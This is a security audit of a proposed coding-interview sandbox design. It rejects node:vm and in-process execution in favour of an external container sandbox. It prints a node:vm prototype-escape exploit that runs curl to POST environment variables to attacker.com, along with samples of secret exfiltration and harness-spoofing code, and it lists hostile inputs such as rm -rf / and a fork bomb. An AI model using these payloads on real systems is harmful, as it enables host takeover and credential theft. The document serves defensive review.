# Master Engineering Forensic Audit & Security Review
## Milestone 4: Dynamic Coding & Sandbox Evaluation Engine Specification (v1)

**Document ID:** `reports/technical_interview_milestone4_specification_audit_v1.md`  
**Execution Timestamp:** 2026-11-07T01:10:00+05:30  
**Audit Role:** Principal Software Architect, Application Security Engineer, Backend Systems Engineer, and Assessment Specialist  
**Reviewed Specification:** `docs/technical_interview_milestone4_implementation_spec_v1.md`  
**Status:** FORENSIC AUDIT COMPLETE  
**Target Deployment Target:** `https://cognalyze-gules.vercel.app` (Verified Local Target)  

---

## 1. Executive Summary & Verification Scope

An exhaustive forensic security and architectural audit was performed on the proposed **Milestone 4 — Dynamic Coding & Sandbox Evaluation Engine Specification (v1)** against the live Cognalyze codebase, its dependencies, runtime environments, and deployment topology.

### Absolute Boundary Confirmation:
- **Zero application code was modified or implemented for Milestone 4.**
- **No execution endpoints or sandbox workers were created.**
- **No database migrations were executed.**
- **No dependencies were installed.**
- **Zero remote commits or pushes occurred; no Vercel deployments were made.**
- **Milestones 1, 2, and 3 code and tests remain untouched and 100% passing.**

### Core Audit Verdict: **READY WITH CONDITIONS**
The conceptual direction of Milestone 4 is exceptionally valuable for Cognalyze's technical interview product identity. However, **Specification v1 contains 4 CRITICAL security vulnerabilities and 3 HIGH-risk architectural incompatibilities** with the target Vercel serverless environment. 

Executing untrusted candidate code using `node:vm` or unhardened child processes directly inside the Next.js serverless runtime exposes application secrets, allows VM escapes, and will fail in production because native compilers and Python runtimes are absent on Vercel Node.js serverless functions.

Implementation **MUST NOT** proceed under Specification v1. Implementation may proceed **ONLY** under the revised **Specification v2** (`docs/technical_interview_milestone4_implementation_spec_v2.md`), which replaces in-process VM execution with a decoupled, containerized sandbox architecture (e.g., self-hosted Judge0/Piston or dedicated hardened execution workers).

---

## 2. Existing Repository Capability Inventory

Before evaluating the proposed design, the live repository was audited to catalog existing code execution, testing, security, and persistence capabilities:

| Component | Existing Implementation in Repository | Reusable for M4? | Missing Capability Required for M4 | Risk Level |
| :--- | :--- | :---: | :--- | :---: |
| **DSA Problem Catalog** | `lib/skills/dsa-canonical-problems.ts` (1,888 lines, 89 canonical problems with signatures, test cases, starter code, follow-ups) | **YES (High Value)** | Needs dynamic parameterizer to mutate identifiers and edge constraints per session | **LOW** |
| **JavaScript In-Process Runner** | `lib/skills/dsa-code-runner.ts` (`executeJavaScriptSuite` using `vm.runInContext`) and `lib/simulation/oa-generator.ts` (`new Function`) | **NO (Security Hazard)** | No process isolation, no prototype escape protection, vulnerable to host process takeover | **CRITICAL** |
| **Python In-Process Runner** | `lib/skills/dsa-code-runner.ts` (`spawnSync("/usr/bin/python3")`) and `app/api/simulation/execute-code/route.ts` | **PARTIAL (Local only)** | Environment variable sanitization (`process.env` leakage), Linux cgroups/namespaces. Absent on Vercel Node.js images. | **CRITICAL** |
| **C++ & Java Execution** | `lib/skills/dsa-code-runner.ts` (`executeCppSuite`, `executeJavaSuite`) | **NO (Serverless Incompatible)** | Relies on local `/usr/bin/clang++` and `javac`. Neither binary exists on Vercel serverless functions. | **HIGH** |
| **Code Comprehension Sandbox** | `lib/skills/code-comprehension/execution-sandbox.ts` (Node.js `vm` with mock files) | **PARTIAL** | Structured assertion framework is reusable; isolation boundary is inadequate for hostile code | **MEDIUM** |
| **Interview Orchestration DAG** | `lib/interview/interview-planner.ts` (5-stage DAG) & `lib/ai/interview-engine.ts` | **YES (Direct Integration)** | Needs `coding_challenge` stage and test outcome mapping into follow-up questioning | **LOW** |
| **Monotonic Session Store** | `lib/interview-session-store.ts` (Monotonic versioning, turn locks, candidate isolation) | **YES (Direct Integration)** | Needs schema fields for `codeExecutionReport`, keystroke telemetry, and test case pass rates | **LOW** |
| **Database Persistence** | `public.interview_sessions` table in Supabase (`supabase/migrations/20261026_interview_sessions_resilience.sql`) | **YES** | Needs durable relational sub-tables for individual code submissions and test case aggregates | **MEDIUM** |
| **Rate Limiting** | `lib/auth/security.ts` (`rateLimitBuckets` in-memory Map) | **PARTIAL** | Ephemeral per-instance memory resets on serverless cold starts; needs persistent distributed bucket for execution endpoints | **MEDIUM** |
| **Authentication & Tenant Isolation** | `lib/auth/server.ts` (`getAuthenticatedContext`) | **YES** | Strict cookie/token extraction with server-side validation; ready for execution endpoint guards | **LOW** |

---

## 3. Forensic Review of Specification v1 & Threat Analysis

### 3.1 Critical Finding 1: Insecurity of `node:vm` for Hostile Code Execution (CRITICAL)
- **Vulnerability in Spec v1 (§3.3.A):** Spec v1 states: *"Technology: Node.js native node:vm in isolated context (vm.createContext) ... Global Blacklist: Complete denial of process, require, import..."*
- **Forensic Reality:** The official Node.js documentation explicitly cautions:
  > *"The node:vm module is not a security mechanism. Do not use it to run untrusted code."*
- **Attack Scenario:** In standard V8/Node.js, any object created inside `vm.runInContext` inherits from the host environment's prototype chain. Untrusted JavaScript can access the host Function constructor and obtain the host `process` object via prototype traversal:
  ```javascript
  // Host process escape exploit via prototype constructor
  const foreignFunction = this.constructor.constructor;
  const hostProcess = foreignFunction('return process')();
  const childProcess = hostProcess.mainModule.require('child_process');
  childProcess.execSync('curl -X POST -d "$(env)" https://attacker.com/leak');
  ```
- **Impact:** Complete host process takeover, exfiltration of all environment variables (`SUPABASE_SERVICE_ROLE_KEY`, `CLERK_SECRET_KEY`, `GROQ_API_KEY`), and arbitrary command execution.
- **Remediation:** In-process `node:vm` MUST NOT be used as the primary security boundary. Untrusted code execution must occur either in a dedicated containerized sandbox (Judge0 / Piston / nsjail) or, as a local development fallback, inside a dedicated isolated child process with `isolated-vm` (V8 Isolate boundary) or frozen prototypes and stripped process privileges.

### 3.2 Critical Finding 2: Serverless Deployment Incompatibility on Vercel (CRITICAL)
- **Vulnerability in Spec v1 (§3.3.B & Target Deployment):** Spec v1 specifies Python child process execution with `ulimit` and assumes deployment to `https://cognalyze-gules.vercel.app`.
- **Forensic Reality:** Vercel App Router API routes execute inside AWS Lambda microVMs running a minimal Amazon Linux/Debian Node.js image:
  1. `/usr/bin/python3`, `/usr/bin/clang++`, and `javac` **do not exist** in the Vercel Node.js runtime.
  2. No Docker daemon is available inside AWS Lambda / Vercel serverless functions.
  3. Spawning `/usr/bin/python3` will immediately throw `ENOENT` (Command not found) in production.
- **Impact:** Milestone 4 will pass in local developer environments (macOS/Linux with local Python installed) but fail completely upon deployment to `https://cognalyze-gules.vercel.app`.
- **Remediation:** Decouple code execution from the Next.js API server. The Next.js API must dispatch execution requests to an external, hardened execution service (e.g., self-hosted Judge0 CE, Piston, or AWS ECS/Fly.io worker pool with Linux cgroups and seccomp).

### 3.3 Critical Finding 3: Environment Variable & Secret Exfiltration via Subprocess (CRITICAL)
- **Vulnerability in Spec v1 (§3.3.B):** Existing implementations (`lib/skills/dsa-code-runner.ts:264`) and Spec v1 do not guarantee clean environment inheritance.
- **Attack Scenario:** If a Python subprocess is spawned without an explicitly empty environment (`env: {}`), it inherits `process.env`:
  ```python
  import os
  def solve(arr):
      # Exfiltrates DB credentials through the test result string!
      return os.environ.get("DATABASE_URL")
  ```
- **Remediation:** Execution environments must run with a strictly empty environment whitelist (`env: { PATH: "/bin:/usr/bin" }`), stripped of all cloud tokens, database URLs, and application secrets.

### 3.4 Critical Finding 4: Synchronous Serverless Execution & Time Limit Denial of Service (CRITICAL)
- **Vulnerability in Spec v1 (§5.1):** Proposes a synchronous `POST /api/interview/execute-code` endpoint running stress tests at $N = 10^5$.
- **Forensic Reality:** Vercel serverless functions enforce a default 15-second wall-clock execution limit (Hobby/Standard) and max 60s (Pro). An unoptimized $O(N^2)$ candidate solution running across 10 hidden stress test cases with a 2-second timeout per test case will consume $10 \times 2 = 20\text{ seconds}$, causing Vercel to terminate the HTTP request with a `504 Gateway Timeout`. The session state is corrupted, and no test results are returned to the candidate.
- **Remediation:**
  1. Individual test cases must run under a strict 1,000ms wall-clock limit with early-exit on first TLE.
  2. Implement a two-tier execution lifecycle: Synchronous fast-path for smoke tests (< 2s total), with an asynchronous polling/webhook job model (`jobId`, `status: queued | running | completed`) for full multi-test submission runs.

### 3.5 High Finding 1: Unrealistic AST Static Complexity Claims (HIGH)
- **Defect in Spec v1 (§3.4.1):** Claims that static AST parsing will reliably classify code into definitive Big-O categories ($O(1)$, $O(\log N)$, $O(N)$, $O(N \log N)$, $O(N^2)$, $O(2^N)$).
- **Computer Science Reality:** Determining exact runtime complexity from syntax alone is undecidable (Rice's Theorem / Halting Problem). For instance:
  - A loop iterating `while (x > 0) { x = next[x]; }` could be $O(N)$, $O(\log N)$, or infinite depending on pointer graph topology.
  - A recursive function with memoization has an AST identical to unmemoized recursion, but its complexity collapses from $O(2^N)$ to $O(N)$.
  - Nested loops where the inner loop runs an amortized constant number of times (e.g., two-pointer sliding window or monotonic stack) appear as $O(N^2)$ to an AST parser but are actually $O(N)$.
- **Remediation:** Replace purely static AST claims with a **Hybrid Complexity Evaluation Model**:
  1. **Static AST Analysis:** Detects structural heuristics (loop depth, recursion, data structure usage, hardcoded return lookup maps).
  2. **Empirical Curve Fitting:** Executes the solution across 3 scaled inputs ($N_1 = 100, N_2 = 1,000, N_3 = 10,000$) and measures elapsed runtime scaling factor.
  3. **Conversational Verification:** The AI interviewer asks the candidate in the follow-up turn: *"What is the time and space complexity of your solution, and why?"*, scoring verbal reasoning against empirical measurements.

### 3.6 High Finding 2: False Accusations from Raw Paste Telemetry (HIGH)
- **Defect in Spec v1 (§3.4.3):** Tags any candidate pasting a 50-line solution in < 2 seconds as `suspicious_paste_detected: true`.
- **Fairness & Accessibility Risk:**
  - Candidates with motor impairments or visual disabilities using screen readers or assistive software frequently paste formatted blocks.
  - Legitimate candidates writing code in an external local IDE (e.g., VS Code) with local syntax highlighting and pasting into Cognalyze would be falsely flagged as cheaters.
- **Remediation:** Paste telemetry must never cause automatic failure or scolding. It must be recorded as an advisory signal with metadata (paste volume, typing burst rate, focus loss events) visible exclusively to the recruiter in the post-interview report. Clipboard content must never be inspected.

### 3.7 High Finding 3: Inadequate Test Case Isolation & Harness Tampering (HIGH)
- **Defect in Spec v1 (§3.2):** Does not prevent candidate code from tampering with test case harness globals.
- **Attack Scenario:** In JavaScript/Python, a candidate can override `JSON.stringify`, `Array.prototype.push`, or `print` before the harness evaluates results:
  ```javascript
  // Fraudulent pass exploit
  Array.prototype.slice = () => [];
  Object.prototype.toString = () => "true";
  ```
  Or in Python:
  ```python
  import sys
  def solve(arr):
      # Replaces stdout with expected fake harness marker
      sys.stdout.write('__OUTPUT_START__[{"id":"tc_all","status":"ok","output":"true"}]__OUTPUT_END__')
      sys.exit(0)
  ```
- **Remediation:** The execution driver must isolate test execution results out-of-band via standard exit codes, isolated file pipes, or structured sandbox runner output wrappers that candidate code cannot spoof.

---

## 4. Security Control Matrix

| Threat ID | Attack Vector / Scenario | Required Security Control | Enforcement Layer | Verification Test |
| :--- | :--- | :--- | :--- | :--- |
| **SEC-01** | Prototype chain escape (`this.constructor.constructor`) | Decoupled container/isolate sandbox; frozen host prototypes | Execution Worker Runtime | Penetration Test: `TC-SEC-ESCAPE` |
| **SEC-02** | Secret exfiltration (`os.environ['DATABASE_URL']`) | Stripped environment variables (`env: { PATH: "/bin" }`) | Subprocess Spawner / Container | Security Test: `TC-SEC-ENV` |
| **SEC-03** | Serverless DoS via infinite loop (`while(true)`) | Strict 1,000ms wall-clock SIGKILL watchdog per test case | OS Process Watchdog | Timeout Test: `TC-SEC-TLE` |
| **SEC-04** | Fork bomb / process exhaustion (`os.fork()`) | `pids_limit: 16` and `rlimit_nproc: 16` | Linux Cgroups / Sandbox | Resource Test: `TC-SEC-FORK` |
| **SEC-05** | Memory exhaustion / OOM attack (`'x' * 10**9`) | Virtual memory cap (128MB max heap) | Linux Cgroups / V8 Max Old Space | Memory Test: `TC-SEC-MEM` |
| **SEC-06** | Filesystem vandalism (`rm -rf /`) | Read-only root filesystem, isolated ephemeral `/tmp` chroot | Container / Mount Namespaces | Filesystem Test: `TC-SEC-FS` |
| **SEC-07** | Network exfiltration / SSRF (`fetch('http://169.254.169.254')`) | Network disabled (`--net=none` / isolated network namespace) | Network Namespace | Network Test: `TC-SEC-NET` |
| **SEC-08** | Hidden test discovery via reflection | One-by-one test execution; test suite not in candidate memory | Test Harness Driver | Isolation Test: `TC-SEC-INSPECT` |
| **SEC-09** | Test harness output spoofing (`print(__OUTPUT_START__)`) | Out-of-band result serialization via IPC pipe or exit code | Execution Runner | Integrity Test: `TC-SEC-SPOOF` |
| **SEC-10** | Cross-tenant data leakage between sessions | Distinct ephemeral workdirs; UUID isolation; cleanup in `finally` | Filesystem Store | Multi-Tenant Test: `TC-SEC-TENANT` |

---

## 5. Sandbox Architecture Decision

We conducted an architectural comparison across the 4 viable execution options for Cognalyze:

| Metric | Option 1: In-Process `node:vm` / Local Subprocess | Option 2: Hardened Containers (Docker / Podman) | Option 3: MicroVMs (Firecracker / gVisor) | Option 4: Dedicated Sandbox Service (Self-Hosted Judge0 / Piston) |
| :--- | :--- | :--- | :--- | :--- |
| **Isolation Strength** | Very Weak (Host compromise risk) | Strong (OS namespaces, cgroups) | Extreme (Hardware-level microVM) | Strong to Extreme (Built on nsjail/Docker) |
| **Vercel Compatibility**| Incompatible (No Python/C++ binaries) | Incompatible directly on Vercel | Incompatible directly on Vercel | **100% Compatible (HTTP/REST interface)** |
| **Multi-Language Parity** | Broken (Only JS natively on Vercel) | Full (Any compiler/interpreter) | Full (Any compiler/interpreter) | **Full (Python, JS, C++, Java, Go supported)** |
| **Operational Complexity**| Low (but dangerous) | High (Requires container daemon) | Very High (Requires KVM bare metal) | **Medium (Standard Docker container deployment)** |
| **Execution Latency** | 50ms – 200ms | 200ms – 600ms | 100ms – 300ms | 150ms – 400ms |
| **Failure Blast Radius** | Crashes entire Next.js API server | Isolated to single container | Isolated to microVM | **Zero impact on Next.js server** |

### Strategic Decision:
- **Primary Production Architecture:** **Option 4 (Dedicated Sandbox Service)**. Cognalyze Next.js dispatches execution payloads to a hardened execution worker (e.g. self-hosted Judge0 CE or Piston instance hosted on a $5/mo VPS or Railway/Fly.io worker node with network disabled and cgroup bounds).
- **Secondary / Local Development Fallback:** **Option 1 (Hardened Ephemeral Process)**. For local developer test suites without external services, a restricted Node.js child process (`fork`) with stripped `env: {}`, frozen prototypes, and clean memory bounds provides development continuity.

---

## 6. Detailed Defect & Severity Log

| Finding ID | Severity | Category | Description | Remediation in Spec v2 |
| :--- | :---: | :--- | :--- | :--- |
| **FIND-M4-01** | **CRITICAL** | Security | `node:vm` prototype escape allows host takeover | Replaced with decoupled containerized execution service |
| **FIND-M4-02** | **CRITICAL** | Architecture | Vercel serverless has no Python/C++ runtimes | External judge worker handles multi-language compilation |
| **FIND-M4-03** | **CRITICAL** | Security | Unsanitized subprocess environment leaks credentials | Stripped `env: {}` whitelist enforced |
| **FIND-M4-04** | **CRITICAL** | Availability | Synchronous execution of large test suites causes 504 timeouts | Two-tier lifecycle: sync smoke tests + async polling for stress suites |
| **FIND-M4-05** | **HIGH** | Soundness | AST complexity claims to mathematically prove Big-O | Replaced with Hybrid AST + Empirical Curve Fitting + Verbal Dialogue |
| **FIND-M4-06** | **HIGH** | Integrity | Raw paste telemetry risks false accusations for accessibility users | Converted to non-punitive advisory metric for recruiter review |
| **FIND-M4-07** | **HIGH** | Security | Candidate code can overwrite harness globals/outputs | Out-of-band IPC test evaluation prevents output spoofing |
| **FIND-M4-08** | **MEDIUM** | Performance | $N = 10^5$ stress test undefined | Clarified: $N$ is array element length; time bound is 1,000ms |
| **FIND-M4-09** | **MEDIUM** | Data Model | Missing separate submission and test run entities | Added `coding_submissions` and `code_execution_jobs` schemas |
| **FIND-M4-10** | **LOW** | Integration | Spec v1 ignored existing 89 `CanonicalProblem` catalog | Integrated `lib/skills/dsa-canonical-problems.ts` as core catalog |

---

## 7. Approval Gate Recommendation

### Outcome: **READY WITH CONDITIONS**

**Prerequisites for Implementation:**
1. The revised **Milestone 4 Master Specification v2** (`docs/technical_interview_milestone4_implementation_spec_v2.md`) must be formally adopted as the authoritative engineering standard.
2. The team must approve the **Decoupled Sandbox Worker Architecture** (external Judge0/Piston or isolated execution worker) to resolve the Vercel serverless environment incompatibility.
3. Local development fallback runners must use strictly sanitized environments (`env: {}`) and out-of-band test harnesses.

### Verification Attestation:
- No Milestone 4 source code has been written.
- No database migrations were executed.
- No remote Git commits or pushes were made.
- No Vercel deployments were triggered.
- Milestones 1, 2, and 3 remain 100% verified, typecheck clean, and production build compliant.

